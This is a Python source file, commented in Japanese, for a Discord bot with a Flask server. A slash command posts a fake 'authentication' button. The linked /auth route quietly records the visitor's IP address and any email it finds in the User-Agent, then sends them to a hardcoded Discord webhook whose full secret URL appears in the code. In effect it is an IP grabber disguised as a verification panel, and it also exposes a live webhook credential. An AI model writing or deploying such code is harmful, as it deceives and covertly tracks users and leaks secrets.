import os
import threading
import logging
from flask import Flask, jsonify, request, redirect
import discord
from discord.ext import commands
import requests
import re

# ログの設定
logging.basicConfig(level=logging.INFO)

# --- 🚨 Flaskアプリの定義 🚨 ---
app = Flask(__name__)

# --- Discord Botのダミー定義 ---
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    """BotがDiscordに接続されたときに実行されるイベントです。"""
    logging.info(f"Botは正常に起動し、ログインしました。ユーザー: {bot.user}")
    await bot.change_presence(activity=discord.Game(name="稼働中..."))

    # コマンドを同期
    try:
        synced = await bot.tree.sync()
        logging.info(f"スラッシュコマンドを同期しました。登録数: {len(synced)}")
    except Exception as e:
        logging.error(f"スラッシュコマンドの同期中にエラーが発生しました: {e}")

# --- Keep-Alive エンドポイント ---

@app.route("/")
def home():
    """
    Render環境とUptimeRobotなどのヘルスチェックに応答するメインエンドポイント。
    Botの状態に応じて応答を返します。
    """
    if bot.is_ready():
        return "Bot is running and ready!", 200
    else:
        return "Bot is starting up or failed to start...", 503

@app.route("/keep_alive", methods=["GET"])
def keep_alive_endpoint():
    """Botの稼働状態に関わらず、Renderサービスのダウンを防ぐためのエンドポイント。"""
    return jsonify({"message": "Alive"}), 200

# --- Bot実行ロジック ---

def start_bot():
    """Discord Botの実行を別スレッドで開始する関数"""
    TOKEN = os.environ.get("DISCORD_TOKEN")
    if not TOKEN:
        logging.error("致命的なエラー: 環境変数 'DISCORD_TOKEN' が設定されていません。")
    else:
        token_preview = TOKEN[:5] + "..." + TOKEN[-5:]
        logging.info(f"DISCORD_TOKENを読み込みました (Preview: {token_preview})")
        try:
            bot.run(TOKEN)
        except Exception as e:
            logging.error(f"Bot実行中に予期せぬエラーが発生しました: {e}")

# --- IPアドレスとメールアドレスの抽出 ---

def extract_ip_and_email(message):
    ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
    email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')

    ips = ip_pattern.findall(message)
    emails = email_pattern.findall(message)

    return ips, emails

# --- スラッシュコマンドの定義 ---

@bot.tree.command(name="認証パネル設置", description="ユーザーの認証情報を収集します。")
async def auth_panel_setup(interaction: discord.Interaction):
    # 認証ボタンを表示
    view = discord.ui.View()
    button = discord.ui.Button(label="認証に進む", url="https://example.com/auth")
    view.add_item(button)
    await interaction.response.send_message("認証ボタンを押してください。", view=view, ephemeral=False)

# --- Flaskルートの追加 ---

@app.route("/auth", methods=["GET"])
def auth():
    # ここでは、ユーザーがサイトにアクセスした際のIPアドレスとメールアドレスを抽出します
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # ユーザーエージェントからメールアドレスを抽出（例として、ユーザーエージェントにメールアドレスが含まれている場合）
    email = extract_email_from_user_agent(user_agent)

    # Webhookに送信
    user_info = f"ユーザーIP: {user_ip}\n"
    data = {
        "content": f"{user_info}メールアドレス: {email}"
    }
    WEBHOOK_URL = "https://discord.com/api/webhooks/1440776757392441414/0x-51OAe945GtlPK0BY6k3zf34675GLZWL8K7N6AmQ3QnWLBn-nL6yvuWXIG1tjrpwZh"
    requests.post(WEBHOOK_URL, json=data)

    return redirect("https://example.com/thanks")  # 認証完了ページにリダイレクト

def extract_email_from_user_agent(user_agent):
    # ユーザーエージェントからメールアドレスを抽出するロジックをここに追加
    # ここでは簡単のため、ユーザーエージェントに直接メールアドレスが含まれていると仮定
    email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
    emails = email_pattern.findall(user_agent)
    return emails[0] if emails else "メールアドレスが見つかりません"

# --- APIエンドポイントの追加 ---

@app.route("/api/auth", methods=["GET"])
def api_auth():
    # ここでは、ユーザーがAPIにアクセスした際のIPアドレスとメールアドレスを抽出します
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # ユーザーエージェントからメールアドレスを抽出（例として、ユーザーエージェントにメールアドレスが含まれている場合）
    email = extract_email_from_user_agent(user_agent)

    # 返却データの準備
    response_data = {
        "ip_address": user_ip,
        "email": email
    }

    return jsonify(response_data), 200

# --- メイン実行 ---

bot_thread = threading.Thread(target=start_bot)
bot_thread.start()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
